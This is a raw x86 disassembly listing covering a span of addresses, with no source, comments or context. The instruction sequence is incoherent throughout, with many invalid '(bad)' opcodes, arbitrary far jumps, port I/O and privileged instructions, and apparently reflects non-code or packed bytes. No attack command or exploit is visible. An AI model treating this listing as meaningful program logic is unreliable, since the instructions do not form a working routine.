  4170b3:	mov    al,ds:0x522a1b9c
  4170b8:	mov    esi,0x4611c4c3
  4170bd:	leave  
  4170be:	push   eax
  4170bf:	push   0x1a
  4170c1:	aam    0x3c
  4170c3:	mov    WORD PTR [eax],es
  4170c5:	(bad)  
  4170c6:	fdivr  DWORD PTR [ebx-0x7c75453e]
  4170cc:	or     al,0xcf
  4170ce:	xor    BYTE PTR [ebx+0x59a873e5],al
  4170d4:	pop    edx
  4170d5:	jo     0x4170b4
  4170d7:	inc    esi
  4170d8:	push   0xa30feebf
  4170dd:	xchg   edx,eax
  4170de:	sub    al,0x79
  4170e0:	xchg   esp,eax
  4170e1:	mov    eax,ds:0x672484a9
  4170e6:	jae    0x417139
  4170e8:	lahf   
  4170e9:	and    al,0x99
  4170eb:	inc    edx
  4170ec:	push   es
  4170ed:	jmp    0x98f354ca
  4170f2:	sbb    ah,BYTE PTR [ebx+ebp*1]
  4170f5:	jbe    0x417105
  4170f7:	and    al,0x23
  4170f9:	push   esi
  4170fa:	sub    ecx,esp
  4170fc:	cwde   
  4170fd:	lea    eax,[eax+0x25]
  417100:	ins    DWORD PTR es:[edi],dx
  417101:	rol    DWORD PTR [eax],1
  417103:	sub    ebp,edi
  417105:	adc    DWORD PTR [eax-0x43],0xfffffff3
  417109:	mov    cl,0x1f
  41710b:	mov    esp,0xaa3a8c9
  417110:	fist   DWORD PTR [ebx]
  417112:	out    0x17,al
  417114:	sub    eax,0xd17e2e57
  417119:	out    dx,al
  41711a:	ins    DWORD PTR es:[edi],dx
  41711b:	pop    edx
  41711c:	pop    edx
  41711d:	addr16 adc dl,cl
  417120:	out    dx,eax
  417121:	sbb    BYTE PTR [edi+0x74d3d20b],ah
  417127:	test   eax,0xe117e0b2
  41712c:	pop    ecx
  41712d:	mov    ebp,0xb58d7158
  417132:	(bad)  
  417133:	ja     0x4171a0
  417135:	ret    0xf1b
  417138:	push   ebp
  417139:	sub    eax,ebp
  41713b:	test   DWORD PTR [edi-0x756a3764],0x46dcf15e
  417145:	mov    eax,0xdc0dc318
  41714a:	xchg   ebx,eax
  41714b:	mov    dl,0xbe
  41714d:	cs inc esp
  41714f:	test   BYTE PTR [esi],dl
  417151:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417152:	sub    ah,BYTE PTR [esp+esi*4]
  417155:	xchg   BYTE PTR [esi],dl
  417157:	xor    al,0xb9
  417159:	sub    eax,0x37aed10f
  41715e:	cmp    dl,BYTE PTR ss:[ebp-0x22b66746]
  417165:	aaa    
  417166:	dec    eax
  417167:	mov    bl,0xd6
  417169:	fwait
  41716a:	vmread ecx,esi
  41716d:	jge    0x4171b6
  41716f:	jno    0x41714b
  417171:	cld    
  417172:	adc    BYTE PTR [esi+0x3f8afccd],bh
  417178:	and    DWORD PTR [eax],edi
  41717a:	mov    ah,0xc7
  41717c:	cmp    al,0x51
  41717e:	xchg   edx,eax
  41717f:	or     al,0xa8
  417181:	rep ins DWORD PTR es:[edi],dx
  417183:	daa    
  417184:	cmp    eax,0x474cb1d7
  417189:	mov    bl,0x81
  41718b:	mov    ds:0x17cb5a69,eax
  417190:	sar    DWORD PTR [ebx+0x46],1
  417193:	mov    DWORD PTR [edi+edx*2],esp
  417196:	and    BYTE PTR [ebx],0x92
  417199:	arpl   ax,sp
  41719b:	rcl    esp,cl
  41719d:	xchg   ebp,eax
  41719e:	mov    esp,0x86c320be
  4171a3:	sbb    DWORD PTR [ecx],0xffffffd7
  4171a6:	push   ss
  4171a7:	pop    ss
  4171a8:	xchg   ebp,eax
  4171a9:	sti    
  4171aa:	test   DWORD PTR [eax+0x41],eax
  4171ad:	xchg   DWORD PTR [ebx+0x40],ecx
  4171b0:	xchg   ebp,esi
  4171b2:	xor    esi,DWORD PTR [eax+0x4c]
  4171b5:	lods   al,BYTE PTR ds:[esi]
  4171b6:	jl     0x41713e
  4171b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171b9:	lahf   
  4171ba:	ficomp WORD PTR [ecx+eax*1-0x2c44b445]
  4171c1:	fsub   DWORD PTR [esi-0x767216bf]
  4171c7:	lods   al,BYTE PTR ds:[esi]
  4171c8:	pop    edx
  4171c9:	int3   
  4171ca:	jmp    0xe4e98b78
  4171cf:	mov    ecx,0xb4d924fb
  4171d4:	add    dh,al
  4171d6:	aad    0x87
  4171d8:	dec    edx
  4171d9:	enter  0x1e31,0x4b
  4171dd:	(bad)  
  4171de:	push   0xc87eb59b
  4171e3:	push   edi
  4171e4:	cs jmp 0x98249800
  4171ea:	add    ebp,esi
  4171ec:	mov    eax,DWORD PTR [ebx]
  4171ee:	mov    ah,0x9b
  4171f0:	cld    
  4171f1:	xor    BYTE PTR [edx-0x1c],bh
  4171f4:	sbb    al,ch
  4171f6:	xor    al,cl
  4171f8:	xchg   dh,ah
  4171fa:	cmp    DWORD PTR [edx],esp
  4171fc:	cmp    eax,0x4b45fc91
  417201:	pop    ds
  417202:	inc    ebp
  417203:	sub    DWORD PTR [esi+0x77],esp
  417206:	cmc    
  417207:	test   eax,0xd0d2610e
  41720c:	stos   WORD PTR es:[edi],ax
  41720e:	pop    esi
  41720f:	ins    DWORD PTR es:[edi],dx
  417210:	or     al,0xdb
  417212:	ss js  0x41719e
  417215:	in     eax,dx
  417216:	stos   BYTE PTR es:[edi],al
  417217:	mov    DWORD PTR [ecx+esi*1],ebp
  41721a:	daa    
  41721b:	jge    0x417207
  41721d:	add    esp,DWORD PTR [edi]
  41721f:	loop   0x417299
  417221:	int3   
  417222:	jmp    0xdc0d:0xc80c061b
  417229:	call   0x8fca28dc
  41722e:	xor    eax,eax
  417230:	mov    eax,0xb17024de
  417235:	or     BYTE PTR [ecx+0x50d5b714],bh
  41723b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41723c:	fimul  WORD PTR [edx+0x43]
  41723f:	add    ebx,DWORD PTR [edx+ebx*1]
  417242:	dec    ebx
  417243:	jmp    0x417527
  417248:	fsubrp st(0),st
  41724a:	(bad)  
  41724b:	stos   BYTE PTR es:[edi],al
  41724c:	mov    gs,WORD PTR [edx-0x16]
  41724f:	ins    BYTE PTR es:[edi],dx
  417250:	leave  
  417251:	pop    ebx
  417252:	sub    al,0x41
  417254:	cmp    BYTE PTR [esi+0x11],dl
  417257:	div    DWORD PTR [eax+0x26]
  41725a:	jg     0x4172cc
  41725c:	mov    ecx,0x4a70707e
  417261:	sahf   
  417262:	inc    edx
  417263:	retf   0x7c21
  417266:	inc    eax
  417267:	dec    ebp
  417268:	jmp    0x4172d4
  41726a:	dec    edi
  41726b:	cmp    eax,0x5ca76c5f
  417270:	mov    ebx,0xe8dc6943
  417275:	fwait
  417276:	(bad)  
  417277:	pop    ss
  417278:	mov    esp,0x53a39e1d
  41727d:	jnp    0x417247
  41727f:	adc    BYTE PTR [ebx],al
  417281:	mov    esi,ds
  417283:	mov    ebx,0x3ccf327e
  417288:	push   ebx
  417289:	fs js  0x417259
  41728c:	(bad)  
  41728d:	arpl   WORD PTR [ebx],bp
  41728f:	clc    
  417290:	xor    DWORD PTR [esi+esi*1+0x1e],esp
  417294:	mov    dh,0x41
  417296:	sbb    DWORD PTR [eax],edx
  417298:	push   es
  417299:	add    ch,bh
  41729b:	mov    cl,BYTE PTR [edx]
  41729d:	out    0x73,eax
  41729f:	mov    DWORD PTR [ebx-0x54],eax
  4172a2:	xor    ah,BYTE PTR [esi+ebp*8-0x34]
  4172a6:	xor    al,0xde
  4172a8:	mov    ah,0x7e
  4172aa:	ret    0x1c09
  4172ad:	or     DWORD PTR [edx],ebx
  4172af:	shl    DWORD PTR [esi-0x7a],1
  4172b2:	push   ebp
  4172b3:	push   ss
  4172b4:	push   ds
  4172b5:	jo     0x417240
  4172b7:	jne    0x417299
  4172b9:	retf   0x5a52
  4172bc:	jcxz   0x4172ad
  4172bf:	call   DWORD PTR [edx-0x57]
  4172c2:	adc    ebx,DWORD PTR [edi-0x752956db]
  4172c8:	sbb    eax,esi
  4172ca:	call   0x1c5c9351
  4172cf:	sub    edx,ebp
  4172d1:	and    DWORD PTR [edx+0x28],0xffffffd3
  4172d5:	and    bh,al
  4172d7:	(bad)  
  4172d8:	in     eax,dx
  4172d9:	jae    0x417264
  4172db:	dec    ebx
  4172dc:	fldenv es:[ebx]
  4172df:	pop    eax
  4172e0:	mov    BYTE PTR [di-0x5041],0xf2
  4172e6:	xchg   esi,eax
  4172e7:	shl    BYTE PTR [eax+0x58],1
  4172ea:	mov    ah,0x32
  4172ec:	in     eax,dx
  4172ed:	iret   
  4172ee:	pop    esi
  4172ef:	mov    dl,0x96
  4172f1:	pop    ebx
  4172f2:	les    ecx,FWORD PTR [edx]
  4172f4:	iret   
  4172f5:	mov    esi,DWORD PTR [eax+0x23]
  4172f8:	jmp    FWORD PTR [ebp-0x36]
  4172fb:	mov    esp,0x55d900ba
  417300:	into   
  417301:	shl    DWORD PTR [ecx-0x59],0xb3
  417305:	pop    ss
  417306:	leave  
  417307:	mov    bl,BYTE PTR [edi]
  417309:	fsub   QWORD PTR [edx]
  41730b:	push   ebx
  41730c:	call   0x63a7:0x3e82e895
  417313:	inc    ecx
  417314:	or     bl,BYTE PTR [edi+0x14]
  417317:	das    
  417318:	or     ecx,DWORD PTR [edi+0x3d]
  41731b:	jb     0x417315
  41731d:	inc    edx
  41731e:	lods   eax,DWORD PTR ds:[esi]
  41731f:	sahf   
  417320:	inc    ebx
  417321:	mov    al,ds:0xa05ad4d4
  417326:	test   DWORD PTR [edx+ebp*8],ebx
  417329:	int    0x6a
  41732b:	push   cs
  41732c:	imul   edi,DWORD PTR [esp+ebx*8+0x43576649],0xffffffcc
  417334:	xchg   DWORD PTR [ebx],ebp
  417336:	jo     0x41736c
  417338:	outs   dx,BYTE PTR ds:[esi]
  417339:	push   ebx
  41733a:	push   cs
  41733b:	hlt    
  41733c:	sbb    ch,0x41
  41733f:	inc    edi
  417340:	pop    ds
  417341:	pusha  
  417342:	jo     0x417361
  417344:	inc    esi
  417345:	dec    ebx
  417346:	xor    cl,BYTE PTR [ebx+edi*8]
  417349:	xor    al,0x47
  41734b:	scas   eax,DWORD PTR es:[edi]
  41734c:	inc    edx
  41734d:	mov    BYTE PTR [esi],dh
  41734f:	int    0xd3
  417351:	mov    eax,0xb60e34fc
  417356:	mov    ah,0xd6
  417358:	xchg   ecx,eax
  417359:	or     esp,DWORD PTR [ecx+0x17]
  41735c:	dec    edi
  41735d:	ss (bad) 
  41735f:	fs out 0x62,al
  417362:	in     eax,dx
  417363:	dec    eax
  417364:	fwait
  417365:	inc    esp
  417366:	gs sahf 
  417368:	out    dx,al
  417369:	gs xchg edx,eax
  41736b:	test   eax,0xb8f87d20
  417370:	adc    BYTE PTR [edx+0x7],ah
  417373:	jmp    0x9b68:0xdd03e9b4
  41737a:	cld    
  41737b:	jmp    0x4173cf
  41737d:	ror    BYTE PTR [esi+0x1930f29e],0x82
  417384:	div    BYTE PTR [ecx]
  417386:	imul   ebx,DWORD PTR [edx],0x7df0ce84
  41738c:	in     eax,0x40
  41738e:	xor    DWORD PTR [esi+0x323f7024],esi
  417394:	arpl   WORD PTR [eax+ecx*2],bp
  417397:	jecxz  0x41736c
  417399:	cmp    al,0x7b
  41739b:	dec    edi
  41739c:	out    dx,eax
  41739d:	adc    edx,eax
  41739f:	aaa    
  4173a0:	cmp    BYTE PTR [edx-0x56],0xf6
  4173a4:	stos   DWORD PTR es:[edi],eax
  4173a5:	mov    dl,dh
  4173a7:	fdiv   DWORD PTR [esi+0x59926445]
  4173ad:	jmp    0x417332
  4173af:	jnp    0x41733f
  4173b1:	mul    ebp
  4173b3:	(bad)  
  4173b4:	fist   WORD PTR [ebx]
  4173b6:	pop    esp
  4173b7:	sub    bh,bh
  4173b9:	mov    eax,0x9fac3a66
  4173be:	dec    ebp
  4173bf:	jle    0x41740d
  4173c1:	leave  
  4173c2:	(bad)  
  4173c3:	jnp    0x4173ab
  4173c5:	iret   
  4173c6:	test   DWORD PTR [esi+ebx*1+0x360e85b8],esp
  4173cd:	lahf   
  4173ce:	pop    esp
  4173cf:	mov    edx,0xa3655598
  4173d4:	test   eax,0xa84aa588
  4173d9:	xchg   ecx,eax
  4173da:	sub    al,0x7f
  4173dc:	sbb    eax,0xe2a628e5
  4173e1:	stos   DWORD PTR es:[edi],eax
  4173e2:	in     eax,0x88
  4173e4:	inc    esi
  4173e5:	ja     0x417451
  4173e7:	adc    ah,BYTE PTR [esi+0x42]
  4173ea:	mov    cl,BYTE PTR [eax]
  4173ec:	rcl    BYTE PTR [eax-0x42b69917],0xc8
  4173f3:	shr    DWORD PTR [edx-0x3],1
  4173f6:	mov    al,0x94
  4173f8:	dec    BYTE PTR [edi+0xd]
  4173fb:	ins    BYTE PTR es:[edi],dx
  4173fc:	ss loopne 0x41739e
  4173ff:	push   edi
  417400:	mov    edi,0x8811fa7b
  417405:	ins    DWORD PTR es:[edi],dx
  417406:	mov    cl,BYTE PTR [esi-0x387e1e1b]
  41740c:	lea    ecx,[ebx*8-0x2651ce89]
  417413:	sub    esp,eax
  417415:	das    
  417416:	fidiv  DWORD PTR [esi-0x36]
  417419:	xor    DWORD PTR [edx-0x5b],edi
  41741c:	sbb    eax,0xf4548ffd
  417421:	sbb    DWORD PTR [edi-0x7f],ebp
  417424:	mov    WORD PTR [eax],ss
  417426:	int    0x1
  417428:	push   es
  417429:	xor    dl,ch
  41742b:	outs   dx,BYTE PTR ds:[esi]
  41742c:	pop    edi
  41742d:	sub    ecx,DWORD PTR [ebp+0x52]
  417430:	adc    eax,0x767a7cf1
  417435:	xchg   ebp,eax
  417436:	fsub   DWORD PTR [ebx-0x52]
  417439:	stos   BYTE PTR es:[edi],al
  41743a:	clc    
  41743b:	cmc    
  41743c:	lds    esp,FWORD PTR [edx+0x60]
  41743f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417440:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417441:	loopne 0x41742c
  417443:	(bad)  
  417444:	cmp    al,0xe9
  417446:	mov    cl,0x75
  417448:	in     eax,dx
  417449:	xchg   esp,eax
  41744a:	(bad)  
  41744b:	retf   
  41744c:	pop    edi
  41744d:	adc    ch,ah
  41744f:	push   ebx
  417450:	addr16 push edi
  417452:	adc    eax,0x37357f9b
  417457:	lahf   
  417458:	xor    bl,BYTE PTR [edx-0x102ab93]
  41745e:	cmp    ebx,DWORD PTR [ecx+0x15]
  417461:	jnp    0x4174c3
  417463:	cmc    
  417464:	xchg   esp,eax
  417465:	cmp    bh,al
  417467:	popf   
  417468:	add    BYTE PTR ds:0x6bae2e9a,dh
  41746e:	in     al,0x5d
  417470:	pop    esi
  417471:	mov    esp,0xf3e96f35
  417476:	call   0xc00da56c
  41747b:	pushf  
  41747c:	aas    
  41747d:	jecxz  0x417459
  41747f:	(bad)  
  417481:	test   eax,0xbfe6d922
  417486:	mov    bl,0x91
  417488:	sub    dh,0xb0
  41748b:	and    DWORD PTR [ecx+0x76],ebx
  41748e:	std    
  41748f:	dec    edi
  417490:	cmp    esp,DWORD PTR [esi+eax*2-0x5a]
  417494:	cmp    BYTE PTR [edi+0x18ee3551],0x24
  41749b:	jecxz  0x41743c
  41749d:	scas   eax,DWORD PTR es:[edi]
  41749e:	psllq  mm7,0x1
  4174a2:	cdq    
  4174a3:	jbe    0x417515
  4174a5:	(bad)  
  4174a6:	push   ecx
  4174a7:	mov    ecx,0x85eda6a7
  4174ac:	mov    eax,edi
  4174ae:	dec    esp
  4174af:	sbb    eax,0xb61af28e
  4174b4:	adc    DWORD PTR [ebp+0x7e],0x714afec4
  4174bb:	jo     0x4174c1
  4174bd:	lods   eax,DWORD PTR ds:[esi]
  4174be:	pop    esp
  4174bf:	iret   
  4174c0:	gs jae 0x4174b1
  4174c3:	mov    al,ds:0xfaa59a14
  4174c8:	retf   0x5b59
  4174cb:	das    
  4174cc:	dec    esp
  4174cd:	scas   eax,DWORD PTR es:[edi]
  4174ce:	jbe    0x417519
  4174d0:	push   edi
  4174d1:	cmp    eax,0x4976349e
  4174d6:	inc    esi
  4174d7:	fstp   QWORD PTR [esi-0x3f]
  4174da:	mov    edi,fs
  4174dc:	and    al,0xe1
  4174de:	scas   al,BYTE PTR es:[edi]
  4174df:	jg     0x4174b4
  4174e1:	adc    BYTE PTR [ebx],cl
  4174e3:	mov    dh,BYTE PTR [ebx]
  4174e5:	inc    ebx
  4174e6:	or     DWORD PTR [ecx],edi
  4174e8:	sub    al,0xe1
  4174ea:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4174eb:	int    0xe
  4174ed:	fldcw  WORD PTR ds:[edi+0x7ecf537a]
  4174f4:	adc    eax,0x832d96a4
  4174f9:	sbb    eax,0xf31a6cd1
  4174fe:	xchg   dh,ch
  417500:	push   edx
  417501:	test   BYTE PTR [ebp+0x290a9c14],bl
  417507:	daa    
  417508:	mov    al,ds:0xabb84b16
  41750d:	mov    al,0xa
  41750f:	bound  edi,QWORD PTR [ebx+0x10]
  417512:	inc    edi
  417513:	call   0xb21a9ffa
  417518:	sbb    BYTE PTR [ecx],bl
  41751a:	hlt    
  41751b:	(bad)  [esi+0x62]
  41751e:	jno    0x41758c
  417520:	rcr    BYTE PTR [esi-0x7f],0x2a
  417524:	rcl    BYTE PTR [esi+0x1d233c9],cl
  41752a:	pop    ebp
  41752b:	hlt    
  41752c:	pop    ebx
  41752d:	mov    eax,DWORD PTR [ebp-0xc]
  417530:	pop    edi
  417531:	jmp    0x417815
  417536:	cld    
  417537:	pop    esi
  417538:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417539:	addr16 popa 
  41753b:	gs mov esp,0x68365a61
  417541:	mov    eax,edi
  417543:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417544:	out    0xfa,eax
  417546:	mov    ecx,0xb9707f24
  41754b:	jle    0x4175bd
  41754d:	jo     0x4174f5
  41754f:	inc    ecx
  417550:	mov    bh,0xbb
  417552:	cmc    
  417553:	adc    ecx,edi
  417555:	sar    BYTE PTR [edi],cl
  417557:	data16 clc 
  417559:	mov    edx,0x83ffb66c
  41755e:	arpl   WORD PTR [edi],dx
  417560:	lock nop
  417562:	sbb    eax,ecx
  417564:	add    DWORD PTR [ebx-0x6b],ebp
  417567:	imul   ebp,DWORD PTR [esp+ecx*4-0x764c9454],0xffffffe1
  41756f:	loop   0x417577
  417571:	sbb    edi,DWORD PTR [ebx+esi*4-0x8886644]
  417578:	ror    DWORD PTR [eax-0x72067451],0x6a
  41757f:	dec    esp
  417580:	pop    edx
  417581:	pop    esi
  417582:	push   ecx
  417583:	inc    esp
  417584:	mov    dl,0x58
  417586:	sub    BYTE PTR [ebx+eiz*1-0x4e],ah
  41758a:	dec    ebx
  41758b:	idiv   BYTE PTR [eax+0x11395158]
  417591:	das    
  417592:	mov    WORD PTR [ebx+0x68875836],gs
  417598:	mov    esp,0xf2a4ffce
  41759d:	(bad)  
  41759e:	dec    ecx
  41759f:	sar    BYTE PTR [eax-0xc],cl
  4175a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4175a3:	cdq    
  4175a4:	mov    dl,BYTE PTR [ecx+esi*2+0x17]
  4175a8:	sbb    BYTE PTR ds:0xefef52a7,dl
  4175ae:	jmp    0x13c6:0x639c91da
  4175b5:	adc    ch,BYTE PTR [edx-0x4bc9dee8]
  4175bb:	and    ebx,DWORD PTR [ecx+eax*1]
  4175be:	ret    0x255b
  4175c1:	sbb    al,0x1c
  4175c3:	shld   DWORD PTR [ebx],ebx,cl
  4175c6:	addr16 stc 
  4175c8:	cmp    esp,DWORD PTR [ebx]
  4175ca:	or     BYTE PTR ds:0x89ac2388,cl
  4175d0:	cmp    al,0x93
  4175d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4175d3:	inc    esi
  4175d4:	inc    edx
  4175d5:	adc    eax,0x59b96ef2
  4175da:	leave  
  4175db:	repnz push ecx
  4175dd:	jl     0x4175ce
  4175df:	mov    cs,WORD PTR [ebx+0x7a49c177]
  4175e5:	xchg   ecx,eax
  4175e6:	or     bh,0xb8
  4175e9:	mov    DWORD PTR ds:0x53042dc8,esp
  4175ef:	retf   0x6f4c
  4175f2:	push   es
  4175f3:	in     al,dx
  4175f4:	lea    esi,[ecx-0x72]
  4175f7:	pop    esi
  4175f8:	and    bl,BYTE PTR [esi]
  4175fa:	scas   eax,DWORD PTR es:[edi]
  4175fb:	mov    ds:0xe225cf83,al
  417600:	xor    edi,DWORD PTR [edx+0x51]
  417603:	pop    ecx
  417604:	mov    dl,0x3f
  417606:	test   al,0xec
  417608:	sbb    DWORD PTR [edi+0x3635ff80],edx
  41760e:	sti    
  41760f:	popa   
  417610:	sub    ebp,DWORD PTR [edx+0x42071a3a]
  417616:	cdq    
  417617:	mov    eax,ds:0x6359100f
  41761c:	dec    ebp
  41761d:	mov    ch,0x2a
  41761f:	push   ss
  417620:	sbb    eax,0x3c198976
  417625:	mov    bl,0x4a
  417627:	ins    BYTE PTR es:[edi],dx
  417628:	mov    esp,0xabe532b5
  41762d:	mov    ebp,0x4ccf6eb7
  417632:	add    eax,0x1c81d7f6
  417637:	not    DWORD PTR [esi+0x54]
  41763a:	inc    ebp
  41763b:	xchg   ecx,eax
  41763c:	pop    es
  41763d:	add    ch,BYTE PTR [ebp+0x4f]
  417640:	add    ebx,DWORD PTR [ebx+0x3e]
  417643:	data16 sbb BYTE PTR [esi],dl
  417646:	in     eax,dx
  417647:	das    
  417648:	jb     0x41768c
  41764a:	xor    dl,ah
  41764c:	daa    
  41764d:	push   esi
  41764e:	lods   eax,DWORD PTR ds:[esi]
  41764f:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  417651:	es add esp,edx
  417654:	push   0x13
  417656:	and    BYTE PTR [esi+esi*2-0x29641c23],0xaa
  41765e:	loop   0x4176a0
  417660:	jge    0x417690
  417662:	rcl    DWORD PTR fs:[bx-0x6a52],0x57
  417669:	xchg   ebp,eax
  41766a:	pop    ebp
  41766b:	nop
  41766c:	lods   al,BYTE PTR ds:[esi]
  41766d:	fstp   TBYTE PTR [edx+0xee35070]
  417673:	gs add eax,0xd2bc2c4
  417679:	lock out dx,al
  41767b:	mov    al,0x74
  41767d:	mov    edi,0x5f9f2175
  417682:	adc    dl,al
  417684:	cwde   
  417685:	cmp    DWORD PTR [ebp-0x5bbafe35],edi
  41768b:	rcr    BYTE PTR [edx],0x3
  41768e:	in     eax,0xb4
  417690:	out    dx,eax
  417691:	add    BYTE PTR [ebp-0x4f],ah
  417694:	jmp    DWORD PTR [ecx+0x19]
  417697:	cmp    al,0xd5
  417699:	mov    dh,0xe3
  41769b:	addr16 int 0x1a
  41769e:	in     al,0x6d
  4176a0:	adc    dh,BYTE PTR [ecx]
  4176a2:	or     al,0x5d
  4176a4:	popa   
  4176a5:	mov    eax,ecx
  4176a7:	fsub   QWORD PTR [eax+0x46296e20]
  4176ad:	mov    esi,0x3d256fd9
  4176b2:	jnp    0x417642
  4176b4:	idiv   al
  4176b6:	scas   al,BYTE PTR es:[edi]
  4176b7:	mov    ebx,0x81b95198
  4176bc:	cmp    al,0x82
  4176be:	pop    ecx
  4176bf:	ss dec ecx
  4176c1:	dec    ebx
  4176c2:	fwait
  4176c3:	lds    eax,FWORD PTR [ebx+eax*1-0x73]
  4176c7:	push   ebx
  4176c8:	jns    0x4176ba
  4176ca:	fwait
  4176cb:	sbb    DWORD PTR [edi+ecx*4+0x4200e01],0x60b33588
  4176d6:	into   
  4176d7:	gs pop ebp
  4176d9:	or     al,0x8d
  4176db:	push   ecx
  4176dc:	mov    ebp,0x337f594f
  4176e1:	retf   0xb1f
  4176e4:	call   0x2ea1d2b0
  4176e9:	out    0x73,eax
  4176eb:	in     eax,dx
  4176ec:	sar    DWORD PTR [eax-0x22],0xc0
  4176f0:	pop    ds
  4176f1:	pop    es
  4176f2:	add    al,0xe1
  4176f4:	rol    BYTE PTR [ebx+0x7c],1
  4176f7:	je     0x417722
  4176f9:	(bad)  
  4176fa:	lahf   
  4176fb:	(bad)  
  4176fc:	repnz sbb eax,0xb79ccfe7
  417702:	jns    0x41771c
  417704:	jp     0x4176e0
  417706:	mov    eax,0x95ab5ffb
  41770b:	inc    eax
  41770c:	scas   al,BYTE PTR es:[edi]
  41770d:	scas   al,BYTE PTR es:[edi]
  41770e:	adc    ah,BYTE PTR [eax]
  417710:	mov    ebx,0x67e1a6b4
  417715:	and    cl,BYTE PTR [ebx+0x43]
  417718:	cmp    ecx,DWORD PTR [ebx-0x50]
  41771b:	mov    bl,0xe4
  41771d:	enter  0xed32,0x86
  417721:	and    al,0x11
  417723:	xchg   esi,eax
  417724:	(bad)
  417727:	mov    ds:0xc0cb1951,al
  41772c:	mov    ecx,0x6be7b9ea
  417731:	mov    dh,0x79
  417733:	fldenv [edi]
  417735:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417736:	inc    ebx
  417737:	stos   BYTE PTR es:[edi],al
  417738:	sbb    ah,BYTE PTR [ebp+0x60]
  41773b:	add    BYTE PTR [edx-0xd],dl
  41773e:	es sub eax,0x9a63c655
  417744:	stos   DWORD PTR es:[edi],eax
  417745:	arpl   WORD PTR [ecx+0x63],cx
  417748:	lods   eax,DWORD PTR ds:[esi]
  417749:	mov    al,ds:0xcfe27878
  41774e:	inc    ecx
  41774f:	pushf  
  417750:	cmp    DWORD PTR [ebx-0x22b90510],ecx
  417756:	sbb    BYTE PTR [edx+0x8],dh
  417759:	stc    
  41775a:	fs push cs
  41775c:	(bad)  
  41775d:	jmp    0x3b87:0xa6cf68cd
  417764:	push   0xbc2b9675
  417769:	push   ds
  41776a:	lahf   
  41776b:	js     0x41770e
  41776d:	ins    DWORD PTR es:[edi],dx
  41776e:	(bad)  
  41776f:	pop    ebx
  417770:	or     eax,0xb68a7a8f
  417775:	sub    DWORD PTR [esi-0x3f],ebp
  417778:	int    0xc
  41777a:	adc    DWORD PTR [esi],esi
  41777c:	rcl    BYTE PTR [ebx-0x21],cl
  41777f:	imul   eax,DWORD PTR [ebp+eax*2+0x1c0956fc],0xaef31e16
  41778a:	mov    esi,0x2c1acd88
  41778f:	mov    ch,0x10
  417791:	mov    al,ds:0x55bdc8a0
  417796:	fisttp QWORD PTR gs:[esi-0x4a]
  41779a:	or     al,0x5
  41779c:	retf   
  41779d:	int3   
  41779e:	cdq    
  41779f:	jecxz  0x417722
  4177a1:	cmc    
  4177a2:	xchg   edi,eax
  4177a3:	cmp    BYTE PTR [ebp+0x1d],ch
  4177a6:	or     ebx,eax
  4177a8:	int    0xe4
  4177aa:	pop    edi
  4177ab:	add    eax,0xa5df200e
  4177b0:	loopne 0x4177dd
  4177b2:	jo     0x417769
  4177b4:	cmp    al,0x2d
  4177b6:	cmp    BYTE PTR [ebx+0x29],al
  4177b9:	dec    esp
  4177ba:	mov    al,ds:0x86ee7e35
  4177bf:	dec    ebp
  4177c0:	std    
  4177c1:	cwde   
  4177c2:	imul   esp,ecx,0xbf997785
  4177c8:	sbb    al,0x19
  4177ca:	popf   
  4177cb:	pop    ss
  4177cc:	out    0x70,al
  4177ce:	popf   
  4177cf:	adc    al,0x7b
  4177d1:	ror    bl,cl
  4177d3:	(bad)  
  4177d4:	push   esi
  4177d5:	jl     0x4177c6
  4177d7:	imul   DWORD PTR fs:[ecx+0x53569ba1]
  4177de:	aam    0x81
  4177e0:	jb     0x417797
  4177e2:	ds dec ebx
  4177e4:	aam    0x90
  4177e6:	mov    eax,0xdbe52d21
  4177eb:	jb     0x4177fd
  4177ed:	repz xlat BYTE PTR ss:[ebx]
  4177f0:	or     al,0xa
  4177f2:	ins    DWORD PTR es:[edi],dx
  4177f3:	fcomp  QWORD PTR [ebp+0x5bb42177]
  4177f9:	test   eax,0x7a21c763
  4177fe:	cmc    
  4177ff:	and    eax,0xd50b312c
  417804:	and    DWORD PTR [esi+0x0],esi
  417807:	stos   BYTE PTR es:[edi],al
  417808:	add    DWORD PTR [eax],ebx
  41780a:	adc    al,0x51
  41780c:	and    BYTE PTR [edi-0x33],0x10
  417810:	inc    edx
  417811:	loope  0x4177bf
  417813:	lahf   
  417814:	sbb    bl,BYTE PTR [esi+0x5b]
  417817:	leave  
  417818:	ret    0x10
  41781b:	dec    ebp
  41781c:	push   ebp
  41781d:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  417823:	mov    esp,ebp
  417825:	or     ah,dh
  417827:	dec    ebp
  417828:	add    bh,al
  41782a:	add    BYTE PTR [eax],cl
  41782c:	add    BYTE PTR [eax],al
  41782e:	mov    DWORD PTR [eax],0x40f44545
  417834:	xor    DWORD PTR [eax],eax
  417836:	test   DWORD PTR [ebx-0x34070b64],ecx
  41783c:	(bad)  
  41783d:	enter  0x4d45,0xbc
  417841:	mov    esi,DWORD PTR [eax]
  417843:	hlt    
  417844:	test   ebx,ecx
  417846:	pushf  
  417847:	enter  0x4df8,0x8b
  41784b:	mov    DWORD PTR [ebp-0x20],0x890208
  417852:	inc    ebp
  417853:	inc    ebp
  417854:	cld    
  417855:	xor    cl,BYTE PTR [ebx-0xb38b300]
  41785b:	or     BYTE PTR [ebx+0x0],dl
  41785e:	mov    ebx,0x8bd5500
  417863:	call   DWORD PTR [ecx-0x1]
  417866:	pop    es
  417867:	mov    ch,0x33
  417869:	dec    ebx
  41786b:	(bad)  
  41786c:	mov    eax,0x72009ca4
  417871:	push   DWORD PTR [edx]
  417873:	or     BYTE PTR [eax],al
  417875:	jmp    0xff89:0x75c84d03
  41787c:	dec    ebp
  41787d:	loopne 0x41784f
  41787f:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  417885:	add    BYTE PTR [ebx],dh
